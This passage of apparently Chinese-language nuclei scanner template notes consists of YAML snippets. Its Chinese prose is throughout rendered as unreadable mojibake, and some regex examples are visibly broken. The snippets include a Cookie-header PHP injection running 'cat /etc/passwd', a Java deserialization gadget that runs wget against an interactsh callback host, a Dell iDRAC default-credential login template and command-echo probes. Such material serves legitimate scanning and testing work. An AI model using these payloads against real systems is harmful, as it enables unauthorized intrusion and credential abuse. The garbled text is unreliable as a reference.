      - type: status
        status:
          - 200
```
---
#### skip-variables-check
what if my payload contains {{payload here}} and that is not cli env var. Can i escape it or somehow disable nuclei vars detection ?
å½“ä½ çš„è¯·æ±‚å†…å®¹é‡ŒåŒ…å« `{{` æ—¶,ä¼šè¢« nuclei è§£æä¸ºå˜é‡,åŠ è¿™ä¸ªå°±æ˜¯å‘Šè¯‰nucleiä¸è¦è§£æ.
```yaml
requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Cookie: "CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl"
    skip-variables-check: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
```
---
### åŒ¹é…
```yaml
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "http://crm.bd.itf.nc/ICustomerExportToCrmService"
          - "nc.itf.bd.crm"
        part: body
        condition: and
      - type: word
        words:
          - "text/xml"
        part: header
      - type: status
        status:
          - 200
```
**åŒ¹é…æ—¶é—´**
```yaml
# æ­¤æ¨¡æ¿æ˜¯åŸºäºDSLçš„æŒç»­æ—¶é—´åŒ¹é…å™¨çš„ç¤ºä¾‹ï¼Œå½“å“åº”æ—¶é—´ä¸å®šä¹‰çš„æŒç»­æ—¶é—´ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ä¸º6æˆ–å¤§äº6ç§’ï¼‰åŒ¹é…æ—¶ï¼Œè¿”å›trueã€‚
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
```
**é‡å‘½å**
```yaml
    matchers:
      - type: word
        encoding: hex
        name: win2000
        words:
          - "0300000b06d00000123400"
      - type: word
        encoding: hex
        name: win2003
        words:
          - "030000130ed000001234000300080002000000"
      - type: word
        encoding: hex
        name: win2008
        words:
          - "030000130ed000001234000200080002000000"
```
**åŒ¹é…å¤§å°**
```yaml
    matchers:
      - type: dsl
        dsl:
          - "len(body))(.*?)()'
```
**æå–å™¨æ¡ˆä¾‹2**
```yaml
# {"execution_date":"2021-06-05T15:42:39+00:00","message":"Created "}
    extractors:
      - type: regex
        name: exec_date
        part: body
        group: 1
        internal: true
        regex:
          - '"execution_date":"([0-9-A-Z:+]+)"'
# ä¸Šé¢è¿™æ®µå°†æå–å‡º 2021-06-05T15:42:39+00:00
# è¯¦è§ CVE-2020-11978 å†™æ³•
```
**æå–å™¨æ¡ˆä¾‹3**
```yaml
    extractors:
      - type: regex
        part: body
        regex:
          - '()(.*?)()'
```
**é**
ä»¥ä¸‹æ˜¯ä½¿ç”¨å¦å®šæ¡ä»¶çš„ç¤ºä¾‹è¯­æ³•ï¼Œè¿™å°†è¿”å›å“åº” header ä¸­æ²¡æœ‰ phpsessID çš„æ‰€æœ‰ URLã€‚
```yaml
    matchers:
      - type: word
        words:
          - "PHPSESSID"
        part: header
        negative: true
```
ä¸€ä¸ªç®€å•çš„åˆ¤æ–­èœœç½çš„ç¤ºä¾‹
```yaml
      - type: word
        words:
          - "è£è€€ç«‹æ–¹"
          - 'var model = "LW-N605R"'
          - 'password'
          - 'success'
          - 'tomcat'
        part: body
        negative: true
        condition: and
```
**Dynamic variabe**
```yaml
  - method: POST
    path:
      - "{{BaseURL}}/login.php"
    body: "username=admin&password=password&Login=Login&user_token={{session}}"
    matchers:
      - type: kval
        name: session
        internal: true
        part: body
        kval:
          - PHPSESSID
```
---
### çˆ†ç ´
**pitchfork**
```yaml
id: dell-idrac-default-login
info:
  name: Dell iDRAC6/7/8 Default login
  author: kophjager007
  severity: high
  tags: dell,idrac,default-login
requests:
  - method: POST
    path:
      - "{{BaseURL}}/data/login"
    body: "user={{username}}&password={{password}}"
    headers:
      Content-Type: "application/x-www-form-urlencode"
      Referer: "{{BaseURL}}/login.html"
    attack: pitchfork
    payloads:
      username:
        - root
      password:
        - calvin
    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '0'
```
---
### å¸¸ç”¨åŒ¹é…
**etc/passwd**
```yaml
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
```
**c:/windows/win.ini**
```yaml
      - type: regex
        regex:
          - "bit app support"
```
**windows å›æ˜¾**
```
cmd.exe /c set /a 12333*32111
396024963
```
**linux å›æ˜¾**
```
expr 12333 \* 32111
396024963
```
---
### è¿›é˜¶ç”¨æ³•
#### å…¨å±€è¯·æ±‚å¤´
å½“ç›®æ ‡é‡‡ç”¨ Basic Auth , å¯ä»¥ç›´æ¥åœ¨è°ƒç”¨çš„å‘½ä»¤ä¸­åŠ ä¸Šå…¨å±€è¯·æ±‚å¤´,è€Œä¸ç”¨ä¿®æ”¹æ¯ä¸ªæ¨¡æ¿
```
nuclei -u https://target.com -H "Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ=="
```
#### Reusing dynamically extracted values as iterators in http request
- https://github.com/projectdiscovery/nuclei/pull/1288
å¯¹ robots.txt å†…å®¹è¿›è¡ŒæŠ“å–å¹¶è¿ç”¨äºä¸‹ä¸€ä¸ªè¯·æ±‚
```yaml
id: valid-robotstxt-endpoints
info:
  name: Iterate robots.txt and request endpoints
  author: pdteam
  severity: info
requests:
  - raw:
      - |
        GET /robots.txt HTTP/1.1
        Host: {{Hostname}}
      - |
        GET {{endpoint}} HTTP/1.1
        Host: {{Hostname}}
    iterate-all: true
    extractors:
      - part: body
        name: endpoint
        internal: true
        type: regex
        regex:
          - "(?m)/([a-zA-Z0-9-_/\\\\]+)"
    matchers:
      - type: status
        status:
          - 200
```
#### help_functions
```yaml
id: helper-functions-examples
info:
  name: RAW Template with Helper Functions
  author: pdteam
  severity: info
requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        01: {{base64("Hello")}}
        02: {{base64(1234)}}
        03: {{base64_decode("SGVsbG8=")}}
        04: {{base64_py("Hello")}}
        05: {{contains("Hello", "lo")}}
        06: {{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}
        07: {{gzip("Hello")}}
        08: {{hex_decode("6161")}}
        09: {{hex_encode("aa")}}
        10: {{html_escape("test")}}
        11: {{html_unescape("&lt;body&gt;test&lt;/body&gt;")}}
        12: {{len("Hello")}}
        13: {{len(5555)}}
        14: {{md5("Hello")}}
        15: {{md5(1234)}}
        16: {{mmh3("Hello")}}
        17: {{print_debug(1+2, "Hello")}}
        18: {{rand_base(5, "abc")}}
        19: {{rand_base(5)}}
        20: {{rand_char("abc")}}
        21: {{rand_char()}}
        22: {{rand_int(1, 10)}}
        23: {{rand_int(10)}}
        24: {{rand_int()}}
        25: {{rand_text_alpha(10, "abc")}}
        26: {{rand_text_alpha(10)}}
        27: {{rand_text_alphanumeric(10, "ab12")}}
        28: {{rand_text_alphanumeric(10)}}
        29: {{rand_text_numeric(10, 123)}}
        30: {{rand_text_numeric(10)}}
        31: {{regex("H([a-z]+)o", "Hello")}}
        32: {{remove_bad_chars("abcd", "bc")}}
        33: {{repeat("../", 5)}}
        34: {{replace("Hello", "He", "Ha")}}
        35: {{replace_regex("He123llo", "(\\d+)", "")}}
        36: {{reverse("abc")}}
        37: {{sha1("Hello")}}
        38: {{sha256("Hello")}}
        39: {{to_lower("HELLO")}}
        40: {{to_upper("hello")}}
        41: {{trim("aaaHelloddd", "ad")}}
        42: {{trim_left("aaaHelloddd", "ad")}}
        43: {{trim_prefix("aaHelloaa", "aa")}}
        44: {{trim_right("aaaHelloddd", "ad")}}
        45: {{trim_space("  Hello  ")}}
        46: {{trim_suffix("aaHelloaa", "aa")}}
        47: {{unix_time(10)}}
        48: {{url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")}}
        49: {{url_encode("https://projectdiscovery.io/test?a=1")}}
        50: {{wait_for(1)}}
```
#### åµŒå¥—è¡¨è¾¾å¼
```
âŒ {{urldecode({{base64_decode('SGVsbG8=')}})}}
âœ” {{url_decode(base64_decode('SGVsbG8='))}}
```
åœ¨ extractor ä¸­ä½¿ç”¨
- https://github.com/projectdiscovery/nuclei/discussions/1622
```
{{url_decode(base64_decode('{{SGVsbG8=}}'))}}
```
#### self-contained
A new attribute to HTTP requests that marks all the HTTP Requests in that template as self-sufficient, meaning they do not require any input to be executed.
è¿™ä¸ªç”¨çš„æ¯”è¾ƒå±€é™,ä¸€èˆ¬å°±æ˜¯ç”¨äºæ‰¹é‡æ£€æµ‹ API å¯ç”¨æ€§çš„,ä¸¾ä¸ªä¾‹å­,ä½ é€šè¿‡ä¿¡æ¯æ³„éœ²è·å¾—äº†ä¸€ä¸ª API_Key ä½†ä½ ä¸çŸ¥é“è¿™ä¸ªæ˜¯å“ªä¸ªæœåŠ¡çš„ APIkey,æ²¡æœ‰ç‰¹å¾,é‚£ä¹ˆå°±åªèƒ½æ‰¾å“ªäº›å®˜æ–¹APIæ¥å£ä¸€ä¸ªä¸€ä¸ªè¯•,çœ‹å“ªä¸€ä¸ªå¹³å°å¯ä»¥ç”Ÿæ•ˆ,å°±æ˜¯è¿™ä¸ªæ„æ€ã€‚
å›½å†…ç¯å¢ƒç”¨çš„ä¸å¤š,æˆ‘å¯¹è¿™å—ä¹Ÿæ²¡ç ”ç©¶è¿‡.
- https://blog.projectdiscovery.io/nuclei-v2-5-3-release/
```yaml
id: example-self-contained-input
info:
  name: example-self-contained
  author: pdteam
  severity: info
self-contained: true
requests:
  - raw:
      - |
        GET https://example.com:443/gg HTTP/1.1
        Host: example.com:443
    matchers:
      - type: status
        status:
          - 302
```
#### æ–‡ä»¶åè®®
The default file size of the file template read is 1GB
æ–‡ä»¶æ¨¡æ¿é»˜è®¤è¯»å–çš„æ–‡ä»¶å¤§å° 1GB
- https://github.com/projectdiscovery/nuclei/pull/1577
```yaml
file:
  - extensions:
      - all
    extractors:
      - type: regex
        regex:
          - "\"type\": \"service_account\""
```
#### ç½‘ç»œå±‚
```yaml
network:
  - host:
      - '{{Hostname}}'
      - '{{Host}}:22'
    inputs:
      - data: "\n"
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'SSH\-([0-9.-A-Za-z_ ]+)'
      - type: word
        words:
          - Invalid SSH identification string
```
#### è‡ªå®šä¹‰æ¨¡ç‰ˆå˜é‡
è‡ª 2.6.9 ç‰ˆæœ¬å¼€å§‹æ”¯æŒ
```yaml
variables:
  a1: "{{to_lower(rand_base(5))}}"
requests:
  - method: GET
    path:
      - "{{BaseURL}}/?test={{a1}}"
    matchers:
      - type: word
        words:
          - "{{a1}}"
```
---
### éœ€è¦éªŒè¯çš„é—®é¢˜
* å¤šä¸ªå·¥ä½œæµæ¨¡æ¿ä¹‹é—´æ˜¯å¦å¯ä»¥è¿›è¡Œè¯·æ±‚åˆå¹¶
  * æˆªè‡³ 2.5.4 æ”¯æŒäº†å•ä¸ªå·¥ä½œæµæ¨¡æ¿çš„è¯·æ±‚åˆå¹¶,å¤šä¸ªå·¥ä½œæµæ¨¡æ¿çš„è¯·æ±‚åˆå¹¶å¹¶ä¸æ”¯æŒ
  * https://github.com/projectdiscovery/nuclei/issues/1379
    * 2.8 ç–‘ä¼¼å·²è§£å†³(å¹¶æ²¡æœ‰ğŸ˜¢)
* å¯¹äºç½‘ç»œå±‚çš„æ¢æµ‹æ˜¯å¦å¯ä»¥é€šè¿‡è°ƒç”¨å¤–éƒ¨åº“æ¥è·å¾—ç»“æœ
  * issue é‡Œå®˜æ–¹æœ‰æ,ä½†ç›®å‰æ²¡æœ‰è¿›ä¸€æ­¥è®¡åˆ’
  * æƒ³è¦å‚è€ƒ fapro
  * https://github.com/projectdiscovery/network-fingerprint
* å€¼çš„ç®¡é“ç”¨æ³•
  * å•æ¨¡æ¿å†…å¯ä¼ é€’,å¤šæ¨¡æ¿ä¹‹é—´ä¸å¯ä¼ é€’
* BSç‰ˆæœ¬ nuclei/api
  * ç›®å‰ä¸æ”¯æŒ